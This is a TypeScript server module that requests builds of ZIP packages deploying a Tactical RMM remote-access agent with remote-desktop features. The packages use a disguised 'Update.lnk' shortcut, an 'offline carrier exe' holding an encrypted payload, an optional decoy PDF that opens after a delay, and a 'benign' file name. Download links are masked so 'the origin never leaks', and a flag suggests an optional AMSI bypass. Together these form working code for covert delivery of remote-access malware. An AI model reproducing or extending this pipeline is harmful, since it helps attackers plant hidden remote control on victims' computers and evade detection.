import "server-only";

import { env } from "./env";

export interface ZipResult {
  jobId: string;
  downloadUrl: string;
  expiresAt: string;
}

export interface CallZipGeneratorOpts {
  clientId: number;
  siteId: number;
  agentType: string; // "workstation" | "server"
  authToken: string; // the fresh 72h TRMM Deployment uid
  apiUrl: string; // TRMM base API URL — same as TRMM_API_BASE_URL
  exeUrl: string; // the deploy URL of the exe the Agent.lnk downloads at runtime
  features?: string[]; // e.g. ["rdp", "ping", "power"]
  fileName?: string; // benign exe filename — default "trmm-agent.exe"
  expiryHours: number; // 24 | 72 — the generator enforces this window
  // Task 74: customer-facing download host for THIS build (e.g.
  // "https://dl.broks.beauty" for public-tier orgs; undefined = generator
  // default). Allowlisted generator-side; unknown tiers omit it so the
  // generator keeps today's behavior byte-identical.
  downloadHost?: string;
  // launcher mode (WP4): zip ships { Update.lnk, Launcher.exe } — the .lnk runs
  // the offline carrier exe directly (encrypted payload inside, nothing
  // downloaded at runtime). Absent/false = legacy Agent.lnk downloader zip.
  launcherMode?: boolean;
  // FIX 3 — optional renameable artifact names (launcher mode). Blank/default
  // values are omitted from the /build body so the generator uses its own
  // defaults (byte-identical to the confirmed flow). Sanitized here too (same
  // bare-name rule as the generator).
  updateLinkName?: string; // the .lnk entry name (default "Update.lnk")
  innerFolder?: string; // the subfolder holding launcher+payload (default "launcher")
  zipName?: string; // the served download filename (default "Agent.zip")
  // Task 77 (FIX 5) — optional attached guide PDF. `pdfBase64` is the full
  // `data:application/pdf;base64,…` URL (validated upstream in the route);
  // `pdfName` is the bare `*.pdf` entry name. When unset both keys are omitted
  // from the /build body so the no-PDF flow stays byte-identical.
  pdfBase64?: string;
  pdfName?: string;
  // Optional PDF open delay in seconds (0–120, generator default 0 = open
  // immediately). Omitted unless explicitly set.
  pdfDelaySec?: number;
}

// FIX 3: bare-name sanitizer — mirrors the generator's `clean` rule so a user
// can't smuggle path separators / control chars / ".." traversal. Blank or
// invalid -> "" (caller omits the flag so the generator uses its default).
const INVALID_ARTIFACT_NAME = /[/\\"\u0000-\u001f]/;
function safeArtifactName(value: string | undefined): string {
  const s = (value ?? "").trim();
  if (!s) return "";
  if (INVALID_ARTIFACT_NAME.test(s) || s.includes("..") || s.length > 64) return "";
  return s;
}

// Task 77 (FIX 5): PDF entry-name sanitizer — mirrors the generator's pdfName
// rule (`routes.ts` postBuildZip: bare `*.pdf`, ≤64 chars, no `/ \ : "` /
// control chars / `..`). Blank or invalid -> "" (caller omits the PDF name so
// the generator falls back to `guide.pdf`; the route rejects invalid names
// earlier with a 400, so this is defense-in-depth, not the first gate).
const INVALID_PDF_NAME = /[/\\:"\u0000-\u001f]/;
function safePdfName(value: string | undefined): string {
  const s = (value ?? "").trim();
  if (!s) return "";
  if (!/\.pdf$/i.test(s)) return "";
  if (INVALID_PDF_NAME.test(s) || s.includes("..") || s.length > 64) return "";
  return s;
}

/**
 * Calls the ZIP installer generator (STAGE 2). This is the SAME Fastify service
 * as the MSI generator by default (via MSI_GENERATOR_URL/SECRET); a separate
 * ZIP_GENERATOR_URL may be pointed at a dedicated host, but the bearer secret
 * is always MSI_GENERATOR_SECRET.
 *
 * POSTs a JSON `application/json` body to `${zipGeneratorUrl}/build`, bearer
 * authenticated, 60s timeout. Success returns `{ jobId, downloadUrl,
 * expiresAt }` — `downloadUrl` is the generator-minted MASKED link (through
 * the redirector base URL) so the origin never leaks. Any failure throws; the
 * caller catches and returns a 502 (the underlying TRMM Deployment/Site are
 * not rolled back, matching the spec).
 *
 * Like the MSI path, this is only invoked when the generator is configured
 * (`env.zipGeneratorUrl` + `env.msiGeneratorSecret`); the caller checks that
 * first and returns a friendly 503 otherwise.
 */
export async function callZipGenerator(
  opts: CallZipGeneratorOpts,
): Promise<ZipResult> {
  if (!env.zipGeneratorUrl || !env.msiGeneratorSecret) {
    throw new Error(
      "ZIP generator is not configured (MSI_GENERATOR_URL / MSI_GENERATOR_SECRET not set).",
    );
  }

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 60_000);

  // FIX 3: sanitize the optional renameable names once; blank/invalid -> ""
  // (omitted below so the generator uses its defaults — byte-identical flow).
  // The .lnk extension is REQUIRED for Explorer to launch the shortcut, but the
  // user should only type a friendly name — auto-append ".lnk" when omitted.
  let flagUpdateLinkName = safeArtifactName(opts.updateLinkName);
  if (flagUpdateLinkName && !/\.lnk$/i.test(flagUpdateLinkName)) {
    const withExt = flagUpdateLinkName + ".lnk";
    flagUpdateLinkName = withExt.length <= 64 ? withExt : "";
  }
  const flagInnerFolder = safeArtifactName(opts.innerFolder);
  const flagZipName = safeArtifactName(opts.zipName);
  // Task 77 (FIX 5): sanitize the optional PDF name once; blank/invalid -> ""
  // (omitted below so the generator uses its `guide.pdf` default). The base64
  // `pdf` payload itself is validated upstream in the route (magic + size).
  const flagPdfName = safePdfName(opts.pdfName);
  const rawPdfDelay =
    typeof opts.pdfDelaySec === "number" ? opts.pdfDelaySec : Number(opts.pdfDelaySec);
  const flagPdfDelaySec =
    Number.isFinite(rawPdfDelay) && rawPdfDelay >= 0 && rawPdfDelay <= 120
      ? Math.floor(rawPdfDelay)
      : undefined;
  const hasPdf =
    typeof opts.pdfBase64 === "string" && opts.pdfBase64.trim() !== "";

  try {
    const res = await fetch(`${env.zipGeneratorUrl}/build`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${env.msiGeneratorSecret}`,
      },
      body: JSON.stringify({
        exeUrl: opts.exeUrl,
        apiUrl: opts.apiUrl,
        clientId: opts.clientId,
        siteId: opts.siteId,
        agentType: opts.agentType,
        authToken: opts.authToken,
        features: opts.features ?? ["rdp", "ping", "power"],
        expiryHours: opts.expiryHours,
        // Task 74: tier-resolved download host (public-tier orgs only; the
        // generator allowlists it and ignores unknown/foreign values).
        ...(opts.downloadHost ? { downloadHost: opts.downloadHost } : {}),
        ...(opts.launcherMode ? { launcherMode: true } : {}),
        // Task 77 (FIX 5): optional guide PDF at the TOP level (sibling of
        // launcherMode, NOT inside flags). Omitted entirely when no PDF is
        // attached so the no-PDF flow stays byte-identical.
        ...(hasPdf ? { pdf: (opts.pdfBase64 as string).trim() } : {}),
        ...(hasPdf && flagPdfName ? { pdfName: flagPdfName } : {}),
        ...(hasPdf && flagPdfDelaySec !== undefined ? { pdfDelaySec: flagPdfDelaySec } : {}),
        flags: {
          amsi: "none", // Guardrail: AMSI default none — never a bypass by default.
          fileName: opts.fileName ?? "trmm-agent.exe",
          // FIX 3: optional renameable names — only send when sanitized present.
          ...(flagUpdateLinkName ? { updateLinkName: flagUpdateLinkName } : {}),
          ...(flagInnerFolder ? { innerFolder: flagInnerFolder } : {}),
          ...(flagZipName ? { zipName: flagZipName } : {}),
        },
      }),
      signal: controller.signal,
    });
    const data = (await res.json().catch(() => ({}))) as Partial<ZipResult> & {
      error?: string;
    };
    if (!res.ok) {
      throw new Error(data.error ?? `ZIP generator ${res.status}`);
    }
    if (!data.downloadUrl || typeof data.downloadUrl !== "string") {
      throw new Error("ZIP generator response missing downloadUrl");
    }
    return {
      jobId: typeof data.jobId === "string" ? data.jobId : "",
      downloadUrl: data.downloadUrl,
      expiresAt:
        typeof data.expiresAt === "string"
          ? data.expiresAt
          : new Date().toISOString(),
    };
  } catch (err) {
    if (err instanceof DOMException && err.name === "AbortError") {
      throw new Error("ZIP generator timed out after 60s");
    }
    throw err;
  } finally {
    clearTimeout(timeout);
  }
}